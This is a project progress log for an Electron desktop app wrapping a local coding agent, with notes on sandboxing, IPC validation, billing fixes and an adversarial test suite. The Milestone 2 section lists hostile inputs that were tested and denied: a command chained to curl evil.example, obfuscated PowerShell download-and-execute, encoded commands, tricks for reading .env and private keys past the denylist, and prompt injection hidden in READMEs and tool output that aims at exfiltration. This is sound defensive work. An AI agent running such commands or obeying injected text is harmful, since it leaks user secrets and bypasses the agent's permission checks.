# Ufuk — Progress

## 2026-09-23 — Milestone 3: Frontend skeleton + security baseline

**Baseline:** agent 231 tests / backend 115 tests, all green.

### What was done

`frontend/` (product name **Ufuk**, package `ufuk`), wired into a root pnpm
workspace (`pnpm-workspace.yaml` includes `evren-agent/packages/*` +
`frontend`, so `@evren/agent-core` / `@evren/local-runner` are imported as
`workspace:*` — no forked logic; `evren-agent` keeps its own nested
workspace file and tests unchanged).

- **Stack:** electron-vite v5 (rolldown), Electron 44.4.3, React 18 +
  TypeScript strict (node/web split tsconfigs), Tailwind v4, Zustand,
  vitest (happy-dom for DOM tests, `@vitest-environment node` docblocks for
  main-process tests), Playwright Electron.
- **Architecture:** main process hosts the gateway session (GatewayAuth /
  GatewayClient from agent-core, rebuilt when the backend URL setting
  changes, token file namespaced per backend hash). Renderer is UI-only:
  `contextIsolation: true`, `nodeIntegration: false`, `sandbox: true`,
  `webSecurity: true`; all permission requests denied; ALL navigation
  blocked (single-page app; external links go through a confirmed
  `shell.openExternal` IPC); `window.open` denied via `setWindowOpenHandler`;
  `<webview>` attachment prevented; single-instance lock.
- **IPC contract:** `shared/channels.ts` (channel names, every channel
  documented) + `shared/ipc.ts` (zod schemas, `InvokeMap`/`EventMap`
  type-level tables, `IpcResult` envelope). Preload exposes exactly two
  functions (`invoke`/`subscribe`) with channel allowlists. Main re-validates
  every sender (`isTrustedSender`: own origin only) and zod-validates every
  payload. `chat:event` channel declared to freeze the contract for M5/6.
- **Tokens:** Electron safeStorage (DPAPI) `TokenStore` implementation
  (`tokens-<hash>.bin` per backend), plain-JSON flagged fallback when
  safeStorage is unavailable, corrupted-file handling forces re-login. The
  CLI file store keeps working; the app deliberately does NOT share CLI
  tokens (refresh rotation + reuse detection would revoke both).
- **CSP:** injected as a meta tag at build time by a vite plugin
  (`shared/csp.ts`): production is fully strict (`script-src 'self'`, no
  unsafe-inline/eval anywhere); dev only widens `style-src` (Vite HMR) and
  the HMR websocket.
- **Untrusted output:** `SafeMarkdown` (react-markdown + rehype-sanitize,
  default schema) — no raw HTML, links render as buttons that go through
  the confirmed openExternal IPC (http(s) only, enforced in main by
  `parseExternalUrl`), code blocks inert.
- **better-sqlite3:** kept external in the bundle; `rebuild:native` script
  (electron-builder install-app-deps) configured. See open issues.

### Bugs found and fixed while finishing the milestone

- **`electron` npm shim bundled into main+preload** (the app printed
  "Downloading Electron binary..." and died with "Unable to find Electron
  app at .../install.js"): electron-vite v5's `externalizeDepsPlugin()`
  only externalizes `dependencies`, and `electron` is a devDependency.
  Explicit `rollupOptions.external: ["electron", ...]` for main and preload
  fixes it. Regression-covered by the e2e suite (app must boot).
- **Security handlers registered too late:** `web-contents-created`
  handlers were attached inside `installSecurityDefaults(window)` after the
  window existed, so `setWindowOpenHandler`/`will-navigate` never applied
  to the main window. Now installed in `whenReady()` BEFORE the first
  window; e2e asserts window.open is blocked.
- zod v4 strictness: `z.string().email()` regex rejects 1-letter TLDs
  (tests now use realistic emails); `z.string().url()` accepts any scheme →
  `backendUrl` now requires http(s) via a refine; schema-internal `.options`
  poking replaced by behavioral enum tests.
- Gateway session helpers (`/me`, `/privacy/info`) used the global fetch →
  now use the session's injectable `fetchImpl` (testable without network).
- Renderer IPC client bound `window.ufuk` eagerly at import time (broke
  unit tests without a bridge) → lazy binding.

### Test counts

- frontend: **52 unit** (7 files) + **7 Playwright Electron e2e** (window
  opens, sandbox/node-leak checks, webPreferences baseline, strict CSP,
  window.open blocked, IPC round-trip, channel allowlist)
- evren-agent: 231 (untouched), evren-backend: 115 (untouched)
- lint + typecheck clean (eslint 9 flat config, prettier, two tsconfigs)

### Commits

- outer repo: `frontend/` skeleton + security baseline, root workspace
  files, README, docs

### Open issues / notes

- **better-sqlite3 cannot load under Electron 44 yet:** Electron 44 uses
  ABI 149; better-sqlite3 v12.11.1 publishes prebuilds only up to
  electron-v146, and this machine has no VS Build Tools (node-gyp fails).
  `rebuild:native` is configured for when either changes. The app therefore
  runs on the **JSONL fallback** (by design: `openConversationStore` prefers
  SQLite, falls back to JSONL — tested in local-runner). Revisit when
  better-sqlite3 ships ABI-149 prebuilds or install VS Build Tools.
- M4+ (login/settings/privacy UI, projects, chat) still to come; the M3
  shell only proves the security baseline end to end.

## 2026-09-22 — Milestone 2: Agent security suite

**Baseline:** agent 188 tests / backend 115 tests, all green.

### What was done

New adversarial suites in `evren-agent/packages/local-runner/test/`:

1. **`path-safety.adversarial.test.ts` (19 tests)** — `..\` traversal with
   mixed separators, absolute/UNC/admin-share/`\\?\` inputs, drive-letter
   case tricks, 8.3 short names, junctions/symlinks pointing outside,
   dangling symlinks, reserved device names, alternate data streams,
   trailing dots/spaces, very long paths (incl. escapes), case-insensitive
   denylist, `.env`/`*.pem`/`id_rsa*`/`.git/config` at any depth, plus
   tool-level (read/write) enforcement.
2. **`commands.adversarial.test.ts` (19 tests)** — obfuscated PowerShell
   (IEX variants, concatenation/backticks/env-indirection, encoded flags),
   download-and-execute, registry/disk/shutdown, deletion outside the
   workspace, cmd `/c` chaining, output flooding, hung processes, orphan
   grand-children, env listing; remembered-rule chaining bypass; approval
   handler sees the real command.
3. **`prompt-injection.test.ts` (5 tests)** — README/comment/tool-output
   hidden instructions; permission engine never bypassed; approval shows
   the real command; `.env` exfiltration surfaces for approval; unattended
   mode allowlist-only with floors intact.

### Bypasses found and fixed (all with regression tests)

- **ADS bypass**: `.env:hidden` / writes to `file.txt:stream` passed the
  denylist → alternate data stream syntax now rejected (any colon past the
  drive letter).
- **Trailing dot/space bypass**: `.env ` / `.env.` hit the real `.env` on
  disk while evading the denylist (Win32 strips them) → rejected.
- **Case bypass**: files created as `.ENV`/`SECRET.PEM` evaded the
  case-sensitive denylist on Windows → matching is now case-insensitive.
- **Reserved device names** (CON/NUL/COM1…) were unchecked → rejected
  before any fs access.
- **Remembered-rule chaining bypass**: `npm test & curl evil.example`
  auto-allowed by a remembered `npm test` prefix rule → chained commands
  now match exactly only.
- **Obfuscated execution**: plain `iex`/`Invoke-Expression` (not only after
  a download pipe), `& $env:…`, `[environment]::getenvironmentvariable`,
  `powershell -e <b64>`, `Format-Volume` spellings were not denied → new
  deny floors + a deobfuscation pass (backticks, string concatenation).
- `.git/config` added to the denylist; `cmd /c` wrappers get an ask floor;
  `\\?\`-prefixed inputs normalized instead of confusingly rejected.

Remaining limits documented honestly in `docs/SECURITY.md` (no OS sandbox,
deobfuscation is best-effort, shell commands can name denylisted files and
rely on the visible approval prompt, prompt injection is contained at the
permission engine, not at the model).

### Test counts

- evren-agent: **231 passed** (agent-core 76, local-runner 155; +43 new)
- evren-backend: 115 (untouched this milestone)

### Commits

- evren-agent (nested repo): security suite + fixes
- outer repo: gitlink update, docs/SECURITY.md, PROGRESS.md

## 2026-09-21 — Milestone 1: Backend fixes

**Baseline before:** agent 188 tests / backend 100 tests, all green
(verified fresh, see docs/STATUS.md).

### What was done

1. **Plan change no longer resets usage counters.** `assign_plan`
   (evren-backend/app/services/subscriptions.py) now inherits the current
   billing period when a subscription is active at assignment time: the new
   plan's limit applies to credits already used in that period. A fresh
   30-day period starts only when there is no active subscription. The Redis
   credit-ledger key (derived from `period_start.date()`) is preserved
   automatically, so concurrent-request protection carries over too.
   Rule documented in the function docstring, README (Credits section) and
   gateway-contract changelog (M9).
   - New regression tests: `tests/test_plan_change_usage.py` (5 tests):
     period+usage preserved on upgrade, **re-assigning the same plan does not
     reset the period** (the abuse vector), downgrade below usage → next
     request 402 with the upstream never called, expired subscription → fresh
     period, first assignment for a user without subscription.
2. **Credit rates are data, not code.** Rates were already DB columns
   (admin-editable); added the missing operator tooling and documentation:
   - `scripts/derive_credit_rates.py`: converts upstream USD/1M list prices
     into per-tier credit rates given margin and credits-per-USD; prints
     ready-to-use admin PATCH bodies. Placeholder prices only.
   - README "Credits" section: billing-period rule, rate-change semantics
     (future requests only), derivation formula
     `rate = usd_per_1k × credits_per_usd × (1 + margin)` with worked example.
   - `tests/test_derive_rates.py` (2 tests) pins the formula and the
     6-decimal HALF_UP quantization used by the gateway.
3. **OpenRouter switch by env only — verified.** No code path changed
   provider behavior; verified with a mocked OpenRouter-style upstream
   (`tests/test_openrouter_upstream.py`, 8 tests): usage in the final SSE
   chunk, `: OPENROUTER PROCESSING` comment lines, OpenRouter-style error
   bodies (numeric `code`), 429 with `X-RateLimit-Reset` verbose HTTP-date,
   `Retry-After` forwarded with correct precedence, env-only URL/auth-header
   switch (`Authorization: Bearer` / `X-API-Key`), failed requests never
   charged (usage row FAILED, credits 0, reserve released → next request
   still possible).
   - `app/services/upstream.py::_parse_resets_at` now also accepts HTTP-date
     strings (RFC 1123 via `email.utils.parsedate_to_datetime`, plus the
     verbose "…PM UTC" format some providers use) — previously only epoch
     seconds and ISO-8601.
   - `PROTECTED_USAGE_FIELDS` extended with `cost` (OpenRouter-style upstream
     USD cost) — stripped from client responses like the EVREN-private
     `usage.evren` object.
   - README section "Switching the upstream to OpenRouter (env only)" with
     seed overrides for tier model placeholders.
4. **Ops documentation.** `docs/backup-restore.md` (pg_dump/restore
   procedures, secrets handling, why Redis needs no backup, upgrade/rollback)
   and `docker-compose.prod.yml` + `deploy/Caddyfile` (no DB/Redis host
   ports, api unpublished, Caddy TLS reverse proxy for `UFUK_DOMAIN`,
   SSE-friendly settings, `restart: unless-stopped`). Merged config
   validated with `docker compose config` (needs Compose ≥ v2.24 for
   `!reset`). `.env.example` documents `UFUK_DOMAIN`. Not deployed.

### Test counts

- evren-backend: **115 passed** (100 before, +15 new)
- evren-agent: 188 (untouched this milestone)

### Open issues / notes

- Seeded credit rates (0.5/1.0, 1.5/3.0, 4.0/8.0) remain placeholder values —
  replace with derived rates before production (script provided).
- Renewal at period end is still manual (no background job): when a period
  expires the gateway returns 403 `subscription_inactive` until an admin
  assigns a plan again. Pre-existing behavior, documented in STATUS.md.
- The `.env` on this machine contains real secrets (never committed).
